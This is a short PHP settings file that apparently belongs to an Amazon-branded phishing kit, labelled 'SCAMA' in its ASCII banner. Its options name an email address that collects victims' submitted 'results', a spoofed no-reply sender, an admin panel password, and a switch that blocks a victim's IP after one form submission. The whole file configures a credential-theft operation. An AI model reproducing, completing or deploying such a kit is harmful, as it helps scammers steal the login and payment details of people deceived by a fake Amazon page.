<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
$param = "some"; // Parameter Redirect
$Password = "SOMETHING"; //Admin Panel Password
$Your_Email = "result.something@gmail.com"; // Set your email
$senderlogin = "SOMETHING"; //name sender for Login
$senderemail = "no-reply@official-agility.com"; // Address your results will apear to come from
$One_Time_Access = "block"; // One Time Access: This Blocks the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
?>